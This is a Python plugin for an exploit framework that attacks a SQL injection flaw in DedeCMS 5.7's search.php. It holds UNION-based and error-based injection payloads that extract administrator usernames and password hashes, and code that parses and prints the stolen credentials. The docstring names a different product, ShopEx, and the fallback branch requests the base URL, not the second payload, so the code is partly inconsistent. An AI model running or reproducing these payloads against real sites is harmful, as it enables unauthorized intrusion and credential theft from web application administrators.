

# -*- coding: cp936 -*-
'''
Mst=>exploit=>plugin
'''
import re

class mstplugin:
    '''shopex_4.8.5_sqlInject'''
    infos = [
        ['Plugin','dede5.7_search.php_SQLInject'],
        ['Author','xfkxfk'],
        ['Update','2013/10/25'],
        ['Site','http://www.hackcto.com'],
        ]
    opts  = [
        ['RURL','localhost','Target URL'],
        ['RPATH','/','CMS Path'],
        ['RPORT','80','Target Port'],
        ['PAYLOAD','false','Do Not Need Payload']
        ]
    def exploit(self):
        if  RPORT == '443':
            url = "https://"+RURL+RPATH
        else:
            url = "http://"+RURL+":"+RPORT+RPATH
        poc1    = '/plus/search.php?keyword=as&typeArr[111%3D@`\'`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`\'`+]=a'
        poc2    = '/plus/search.php?keyword=as&typeArr[111%3D@`\'`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`\'`+]=a'  
        url1    = url + poc1
        url2    = url + poc2
        color.cprint("[+] Sending exp ..",YELLOW)

        try:
            res1 = fuck.urlget(url1).read()
            username = fuck.find(r'<h3><a.*?>(\w+)</a></h3>',res1)
            password = fuck.find(r'<p>(\w{20}\.{3})</p>',res1)
            if len(username) != 0 and len(password) != 0:
                username = username[0]
                password = password[0][3:-4]
                color.cprint("[*] Exploit Successful !",GREEN)
                color.cprint("[*] %s : %s"%(username, password),GREEN)
            else:
                res2 = fuck.urlget(url).read()
                username = fuck.find(r'<h3><a.*?>(\w+)</a></h3>',res2)
                password = fuck.find(r'<p>(\w{20}\.{3})</p>',res2)
                if len(username) != 0 and len(password) != 0:
                    username = username[0]
                    password = password[0][3:-4]
                    color.cprint("[*] Exploit Successful !",GREEN)
                    color.cprint("[*] %s : %s"%(username, password),GREEN)                
        except Exception,e:
            color.cprint("[!] Exploit False ! CODE:%s"%e,RED)
